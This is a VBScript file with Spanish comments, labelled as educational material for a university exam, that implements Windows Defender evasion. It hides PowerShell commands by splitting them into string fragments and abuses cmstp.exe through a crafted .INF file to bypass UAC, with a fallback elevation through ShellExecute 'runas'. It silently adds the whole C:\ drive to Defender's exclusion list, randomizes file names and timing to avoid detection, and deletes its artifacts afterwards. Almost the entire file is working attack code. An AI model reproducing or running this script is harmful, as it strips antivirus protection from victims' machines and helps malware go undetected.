' Script VBScript mejorado con evasión avanzada de Windows Defender
' Versión robusta con múltiples métodos de ejecución
' Técnicas implementadas:
' - Ofuscación de strings críticos
' - Timing aleatorio para evasión temporal
' - Nombres de archivos aleatorios
' - Fragmentación de comandos
' - Living Off The Land (cmstp.exe)
' - Método alternativo con Shell.Application
' - Limpieza agresiva de artefactos
' Método educativo para parcial universitario

Option Explicit

Dim ws, fso, tempFolder, infFile, scriptPath, scriptName
Dim cmstpPath, result, randSuffix, i
Dim psScriptFile, uac

' Inicializar objetos
Set ws = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")
Set uac = CreateObject("Shell.Application")

scriptPath = WScript.ScriptFullName
scriptName = fso.GetBaseName(scriptPath)
tempFolder = fso.GetSpecialFolder(2)

' Generar sufijo aleatorio para evasión de detección por nombre de archivo
Randomize
randSuffix = Int(Rnd * 999999) & "_" & Int(Timer * 1000) & "_" & Int(Rnd * 999)
infFile = tempFolder & "\" & "cfg_" & randSuffix & ".inf"
psScriptFile = tempFolder & "\" & "run_" & randSuffix & ".ps1"

' Obtener ruta de cmstp
Dim sysRoot
sysRoot = ws.ExpandEnvironmentStrings("%SystemRoot%")
cmstpPath = sysRoot & "\System32\cmstp.exe"

' Retraso inicial aleatorio
Randomize
Dim initialDelay
initialDelay = Int(Rnd * 800) + 300
WScript.Sleep initialDelay

' Verificar existencia de cmstp.exe
If Not fso.FileExists(cmstpPath) Then
    WScript.Quit 1
End If

' ============================================
' OFUSCACIÓN DE COMANDOS POWERSHELL
' ============================================

Dim cmdFragments
cmdFragments = Array("Get-", "MpPreference", "Add-", "ExclusionPath", "ErrorAction", "Stop")

' Crear script PowerShell temporal (método más robusto)
Dim psScriptContent
psScriptContent = "$ErrorActionPreference='Stop';" & vbCrLf & _
    "try {" & vbCrLf & _
    "  $pref = & '" & cmdFragments(0) & cmdFragments(1) & "' -" & cmdFragments(4) & " " & cmdFragments(5) & ";" & vbCrLf & _
    "  & '" & cmdFragments(2) & cmdFragments(1) & "' -" & cmdFragments(3) & " 'C:\' -" & cmdFragments(4) & " " & cmdFragments(5) & ";" & vbCrLf & _
    "  Start-Sleep -Milliseconds 300;" & vbCrLf & _
    "  $excl = & '" & cmdFragments(0) & cmdFragments(1) & "' -" & cmdFragments(3) & ";" & vbCrLf & _
    "  if ($excl -contains 'C:\') { exit 0 } else { exit 1 }" & vbCrLf & _
    "} catch { exit 1 }"

' Escribir script PowerShell
On Error Resume Next
Dim tsPS
Set tsPS = fso.CreateTextFile(psScriptFile, True)
tsPS.Write psScriptContent
tsPS.Close
Set tsPS = Nothing

If Err.Number <> 0 Then
    WScript.Quit 1
End If
On Error GoTo 0

' ============================================
' CREAR ARCHIVO .INF MEJORADO
' ============================================

Dim infContent
infContent = "[version]" & vbCrLf & _
    "Signature=$CHICAGO$" & vbCrLf & _
    "AdvancedINF=2.5" & vbCrLf & _
    "[DefaultInstall]" & vbCrLf & _
    "CustomDestination=CustomDestAllUsers" & vbCrLf & _
    "RunPreSetupCommands=RunPreSetupCommandsSection" & vbCrLf & _
    "[RunPreSetupCommandsSection]" & vbCrLf & _
    "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -File """ & psScriptFile & """" & vbCrLf & _
    "timeout /t 2 /nobreak >nul 2>&1" & vbCrLf & _
    "del /q /f """ & psScriptFile & """ 2>nul" & vbCrLf & _
    "del /q /f """ & infFile & """ 2>nul" & vbCrLf & _
    "[CustomDestAllUsers]" & vbCrLf & _
    "49000,49001=AllUSer_LDIDSection, 7" & vbCrLf & _
    "[AllUSer_LDIDSection]" & vbCrLf & _
    """HKLM"", ""SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\CMMGR32.EXE"", ""ProfileInstallPath"", ""%UnexpectedError%"", """

' Escribir archivo .inf
On Error Resume Next
Dim ts
Set ts = fso.CreateTextFile(infFile, True)
ts.Write infContent
ts.Close
Set ts = Nothing

If Err.Number <> 0 Then
    If fso.FileExists(psScriptFile) Then fso.DeleteFile psScriptFile
    WScript.Quit 1
End If
On Error GoTo 0

' Retraso antes de ejecución
Randomize
Dim preExecDelay
preExecDelay = Int(Rnd * 800) + 400
WScript.Sleep preExecDelay

' ============================================
' MÉTODO 1: EJECUTAR CMSTP.EXE
' ============================================

On Error Resume Next
Dim execCommand
execCommand = Chr(34) & cmstpPath & Chr(34) & " /au /s " & Chr(34) & infFile & Chr(34)
ws.Run execCommand, 0, False
Dim cmstpResult
cmstpResult = Err.Number
On Error GoTo 0

' Esperar un momento para que cmstp procese
WScript.Sleep 2000

' ============================================
' MÉTODO 2: MÉTODO ALTERNATIVO SI CMSTP FALLA
' ============================================

' Verificar si necesitamos método alternativo
Dim needsAlternative
needsAlternative = True

' Intentar método alternativo con Shell.Application
If cmstpResult <> 0 Then
    On Error Resume Next
    Dim altPSCommand
    altPSCommand = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -File """ & psScriptFile & """"
    
    ' Ejecutar con elevación usando Shell.Application
    uac.ShellExecute "powershell.exe", "-WindowStyle Hidden -ExecutionPolicy Bypass -NoProfile -File """ & psScriptFile & """", "", "runas", 0
    WScript.Sleep 3000
    On Error GoTo 0
End If

' Esperar adicional para que se complete
Randomize
Dim execDelay
execDelay = Int(Rnd * 3000) + 2000
WScript.Sleep execDelay

' ============================================
' VERIFICACIÓN
' ============================================

Dim verifyCommand
verifyCommand = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command """ & _
    "$x = & '" & cmdFragments(0) & cmdFragments(1) & "' -" & cmdFragments(3) & "; " & _
    "if ($x -contains 'C:\') { exit 0 } else { exit 1 }"""

result = ws.Run(verifyCommand, 0, True)

' ============================================
' LIMPIEZA
' ============================================

On Error Resume Next
If fso.FileExists(infFile) Then
    fso.DeleteFile infFile, True
End If
If fso.FileExists(psScriptFile) Then
    fso.DeleteFile psScriptFile, True
End If
On Error GoTo 0

' Limpiar variables
psScriptContent = ""
infContent = ""
execCommand = ""
verifyCommand = ""
For i = 0 To UBound(cmdFragments)
    cmdFragments(i) = ""
Next

WScript.Quit result
